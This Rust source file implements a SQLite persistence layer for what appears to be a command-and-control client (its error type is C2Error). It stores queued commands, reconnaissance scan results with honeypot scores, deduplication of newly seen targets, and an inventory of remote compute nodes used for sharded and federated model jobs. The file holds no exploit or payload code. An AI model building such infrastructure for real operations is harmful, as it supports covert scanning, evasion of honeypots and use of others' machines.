use rusqlite::{Connection, params};
use std::sync::Mutex;
use std::path::Path;

use crate::error::C2Error;

pub struct ClientDb {
    conn: Mutex<Connection>,
}

impl ClientDb {
    pub fn open(path: &str) -> Result<Self, C2Error> {
        let conn = Connection::open(path)
            .map_err(|e| C2Error::CommandError(format!("db open: {}", e)))?;

        let db = ClientDb {
            conn: Mutex::new(conn),
        };
        db.init_schema()?;
        Ok(db)
    }

    pub fn open_memory() -> Result<Self, C2Error> {
        let conn = Connection::open_in_memory()
            .map_err(|e| C2Error::CommandError(format!("db open: {}", e)))?;
        let db = ClientDb {
            conn: Mutex::new(conn),
        };
        db.init_schema()?;
        Ok(db)
    }

    fn init_schema(&self) -> Result<(), C2Error> {
        let conn = self.conn.lock().unwrap();
        conn.execute_batch(
            "
            CREATE TABLE IF NOT EXISTS commands (
                id          INTEGER PRIMARY KEY,
                command     TEXT NOT NULL,
                args        TEXT NOT NULL,
                result      TEXT,
                status      TEXT NOT NULL DEFAULT 'pending',
                created_at  TEXT NOT NULL DEFAULT (datetime('now')),
                completed_at TEXT
            );

            CREATE TABLE IF NOT EXISTS recon_hosts (
                ip          TEXT NOT NULL,
                scan_id     TEXT NOT NULL,
                hostname    TEXT,
                asn         INTEGER,
                org         TEXT,
                country     TEXT,
                is_honeypot INTEGER NOT NULL DEFAULT 0,
                honeypot_score REAL,
                discovered_at TEXT NOT NULL DEFAULT (datetime('now')),
                PRIMARY KEY (ip, scan_id)
            );

            CREATE TABLE IF NOT EXISTS recon_services (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                host_ip     TEXT NOT NULL,
                scan_id     TEXT NOT NULL,
                port        INTEGER NOT NULL,
                protocol    TEXT,
                product     TEXT,
                version     TEXT,
                banner      TEXT,
                tls_cert_sha256 TEXT,
                jarm        TEXT,
                UNIQUE(host_ip, scan_id, port)
            );

            CREATE TABLE IF NOT EXISTS recon_scans (
                scan_id     TEXT PRIMARY KEY,
                target_spec TEXT NOT NULL,
                total_targets INTEGER,
                open_ports  INTEGER,
                started_at  TEXT NOT NULL DEFAULT (datetime('now')),
                completed_at TEXT,
                status      TEXT NOT NULL DEFAULT 'running'
            );

            CREATE TABLE IF NOT EXISTS recon_clusters (
                cluster_id  TEXT NOT NULL,
                scan_id     TEXT NOT NULL,
                member_ip   TEXT NOT NULL,
                evidence    TEXT,
                PRIMARY KEY (cluster_id, scan_id, member_ip)
            );

            CREATE TABLE IF NOT EXISTS compute_nodes (
                node_id     TEXT PRIMARY KEY,
                cpu_cores   INTEGER,
                cpu_freq_mhz INTEGER,
                ram_bytes   INTEGER,
                gpu_name    TEXT,
                gpu_vram    INTEGER,
                gpu_flops   REAL,
                disk_mbps   REAL,
                net_mbps    REAL,
                net_latency_ms REAL,
                os          TEXT,
                arch        TEXT,
                reputation  INTEGER NOT NULL DEFAULT 0,
                last_seen   TEXT NOT NULL DEFAULT (datetime('now'))
            );

            CREATE TABLE IF NOT EXISTS compute_jobs (
                job_id      TEXT PRIMARY KEY,
                job_type    TEXT NOT NULL,
                model_id    TEXT,
                status      TEXT NOT NULL DEFAULT 'pending',
                created_at  TEXT NOT NULL DEFAULT (datetime('now')),
                completed_at TEXT,
                result      TEXT
            );

            CREATE TABLE IF NOT EXISTS shard_assignments (
                shard_id    TEXT PRIMARY KEY,
                job_id      TEXT NOT NULL,
                node_id     TEXT NOT NULL,
                layer_start INTEGER NOT NULL,
                layer_end   INTEGER NOT NULL,
                status      TEXT NOT NULL DEFAULT 'pending',
                FOREIGN KEY (job_id) REFERENCES compute_jobs(job_id)
            );

            CREATE TABLE IF NOT EXISTS federated_rounds (
                job_id      TEXT NOT NULL,
                round       INTEGER NOT NULL,
                participants INTEGER,
                global_loss REAL,
                total_samples INTEGER,
                convergence_delta REAL,
                completed_at TEXT NOT NULL DEFAULT (datetime('now')),
                PRIMARY KEY (job_id, round)
            );

            CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status);
            CREATE INDEX IF NOT EXISTS idx_recon_hosts_ip ON recon_hosts(ip);
            CREATE INDEX IF NOT EXISTS idx_recon_services_host ON recon_services(host_ip);
            CREATE INDEX IF NOT EXISTS idx_compute_nodes_seen ON compute_nodes(last_seen);
            "
        ).map_err(|e| C2Error::CommandError(format!("schema init: {}", e)))?;
        Ok(())
    }

    pub fn insert_command(&self, id: usize, command: &str, args: &[String]) -> Result<(), C2Error> {
        let conn = self.conn.lock().unwrap();
        let args_json = serde_json::to_string(args).unwrap_or_default();
        conn.execute(
            "INSERT OR REPLACE INTO commands (id, command, args) VALUES (?1, ?2, ?3)",
            params![id as i64, command, args_json],
        ).map_err(|e| C2Error::CommandError(format!("insert command: {}", e)))?;
        Ok(())
    }

    pub fn update_command_result(&self, id: usize, result: &str) -> Result<(), C2Error> {
        let conn = self.conn.lock().unwrap();
        conn.execute(
            "UPDATE commands SET result = ?1, status = 'completed', completed_at = datetime('now') WHERE id = ?2",
            params![result, id as i64],
        ).map_err(|e| C2Error::CommandError(format!("update command: {}", e)))?;
        Ok(())
    }

    pub fn insert_scan(&self, scan_id: &str, target_spec: &str) -> Result<(), C2Error> {
        let conn = self.conn.lock().unwrap();
        conn.execute(
            "INSERT OR REPLACE INTO recon_scans (scan_id, target_spec) VALUES (?1, ?2)",
            params![scan_id, target_spec],
        ).map_err(|e| C2Error::CommandError(format!("insert scan: {}", e)))?;
        Ok(())
    }

    pub fn complete_scan(&self, scan_id: &str, total_targets: usize, open_ports: usize) -> Result<(), C2Error> {
        let conn = self.conn.lock().unwrap();
        conn.execute(
            "UPDATE recon_scans SET total_targets = ?1, open_ports = ?2, status = 'completed', completed_at = datetime('now') WHERE scan_id = ?3",
            params![total_targets as i64, open_ports as i64, scan_id],
        ).map_err(|e| C2Error::CommandError(format!("complete scan: {}", e)))?;
        Ok(())
    }

    pub fn upsert_host(
        &self,
        ip: &str,
        scan_id: &str,
        hostname: Option<&str>,
        asn: Option<u32>,
        org: Option<&str>,
        country: Option<&str>,
        is_honeypot: bool,
        honeypot_score: Option<f32>,
    ) -> Result<(), C2Error> {
        let conn = self.conn.lock().unwrap();
        conn.execute(
            "INSERT OR REPLACE INTO recon_hosts (ip, scan_id, hostname, asn, org, country, is_honeypot, honeypot_score)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)",
            params![
                ip,
                scan_id,
                hostname,
                asn.map(|a| a as i64),
                org,
                country,
                is_honeypot as i64,
                honeypot_score,
            ],
        ).map_err(|e| C2Error::CommandError(format!("upsert host: {}", e)))?;
        Ok(())
    }

    pub fn insert_service(
        &self,
        host_ip: &str,
        scan_id: &str,
        port: u16,
        protocol: Option<&str>,
        product: Option<&str>,
        version: Option<&str>,
        tls_cert_sha256: Option<&str>,
        jarm: Option<&str>,
    ) -> Result<(), C2Error> {
        let conn = self.conn.lock().unwrap();
        conn.execute(
            "INSERT OR REPLACE INTO recon_services (host_ip, scan_id, port, protocol, product, version, tls_cert_sha256, jarm)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)",
            params![
                host_ip,
                scan_id,
                port as i64,
                protocol,
                product,
                version,
                tls_cert_sha256,
                jarm,
            ],
        ).map_err(|e| C2Error::CommandError(format!("insert service: {}", e)))?;
        Ok(())
    }

    pub fn upsert_compute_node(
        &self,
        node_id: &str,
        cpu_cores: u32,
        cpu_freq_mhz: u32,
        ram_bytes: u64,
        gpu_name: Option<&str>,
        gpu_vram: Option<u64>,
        gpu_flops: Option<f64>,
        disk_mbps: f64,
        net_mbps: f64,
        net_latency_ms: f64,
        os: &str,
        arch: &str,
        reputation: i32,
    ) -> Result<(), C2Error> {
        let conn = self.conn.lock().unwrap();
        conn.execute(
            "INSERT OR REPLACE INTO compute_nodes
             (node_id, cpu_cores, cpu_freq_mhz, ram_bytes, gpu_name, gpu_vram, gpu_flops,
              disk_mbps, net_mbps, net_latency_ms, os, arch, reputation, last_seen)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?11, ?12, ?13, datetime('now'))",
            params![
                node_id,
                cpu_cores as i64,
                cpu_freq_mhz as i64,
                ram_bytes as i64,
                gpu_name,
                gpu_vram.map(|v| v as i64),
                gpu_flops,
                disk_mbps,
                net_mbps,
                net_latency_ms,
                os,
                arch,
                reputation,
            ],
        ).map_err(|e| C2Error::CommandError(format!("upsert compute node: {}", e)))?;
        Ok(())
    }

    pub fn get_active_compute_nodes(&self, stale_minutes: i64) -> Result<Vec<String>, C2Error> {
        let conn = self.conn.lock().unwrap();
        let mut stmt = conn.prepare(
            "SELECT node_id FROM compute_nodes WHERE last_seen > datetime('now', ?1)"
        ).map_err(|e| C2Error::CommandError(format!("query: {}", e)))?;

        let modifier = format!("-{} minutes", stale_minutes);
        let nodes = stmt.query_map(params![modifier], |row| {
            row.get::<_, String>(0)
        }).map_err(|e| C2Error::CommandError(format!("query: {}", e)))?
          .filter_map(|r| r.ok())
          .collect();

        Ok(nodes)
    }

    pub fn insert_compute_job(&self, job_id: &str, job_type: &str, model_id: Option<&str>) -> Result<(), C2Error> {
        let conn = self.conn.lock().unwrap();
        conn.execute(
            "INSERT OR REPLACE INTO compute_jobs (job_id, job_type, model_id) VALUES (?1, ?2, ?3)",
            params![job_id, job_type, model_id],
        ).map_err(|e| C2Error::CommandError(format!("insert job: {}", e)))?;
        Ok(())
    }

    pub fn insert_federated_round(
        &self,
        job_id: &str,
        round: u32,
        participants: u32,
        global_loss: f64,
        total_samples: u64,
        convergence_delta: f64,
    ) -> Result<(), C2Error> {
        let conn = self.conn.lock().unwrap();
        conn.execute(
            "INSERT OR REPLACE INTO federated_rounds
             (job_id, round, participants, global_loss, total_samples, convergence_delta)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
            params![job_id, round as i64, participants as i64, global_loss, total_samples as i64, convergence_delta],
        ).map_err(|e| C2Error::CommandError(format!("insert round: {}", e)))?;
        Ok(())
    }

    pub fn hosts_seen_before(&self, ip: &str) -> Result<bool, C2Error> {
        let conn = self.conn.lock().unwrap();
        let count: i64 = conn.query_row(
            "SELECT COUNT(*) FROM recon_hosts WHERE ip = ?1",
            params![ip],
            |row| row.get(0),
        ).map_err(|e| C2Error::CommandError(format!("query: {}", e)))?;
        Ok(count > 0)
    }

    pub fn dedup_targets(&self, ips: &[String]) -> Result<Vec<String>, C2Error> {
        let mut novel = Vec::new();
        for ip in ips {
            if !self.hosts_seen_before(ip)? {
                novel.push(ip.clone());
            }
        }
        Ok(novel)
    }

    pub fn save_evolution_state(&self, data: &[u8]) -> Result<(), C2Error> {
        let conn = self.conn.lock().unwrap();
        conn.execute(
            "CREATE TABLE IF NOT EXISTS evolution_state (id INTEGER PRIMARY KEY, data BLOB NOT NULL, saved_at TEXT NOT NULL DEFAULT (datetime('now')))",
            [],
        ).map_err(|e| C2Error::CommandError(format!("evo table: {}", e)))?;
        conn.execute(
            "INSERT OR REPLACE INTO evolution_state (id, data) VALUES (1, ?1)",
            params![data],
        ).map_err(|e| C2Error::CommandError(format!("evo save: {}", e)))?;
        Ok(())
    }

    pub fn load_evolution_state(&self) -> Result<Option<Vec<u8>>, C2Error> {
        let conn = self.conn.lock().unwrap();
        conn.execute(
            "CREATE TABLE IF NOT EXISTS evolution_state (id INTEGER PRIMARY KEY, data BLOB NOT NULL, saved_at TEXT NOT NULL DEFAULT (datetime('now')))",
            [],
        ).map_err(|e| C2Error::CommandError(format!("evo table: {}", e)))?;
        let result = conn.query_row(
            "SELECT data FROM evolution_state WHERE id = 1",
            [],
            |row| row.get::<_, Vec<u8>>(0),
        );
        match result {
            Ok(data) => Ok(Some(data)),
            Err(rusqlite::Error::QueryReturnedNoRows) => Ok(None),
            Err(e) => Err(C2Error::CommandError(format!("evo load: {}", e))),
        }
    }
}
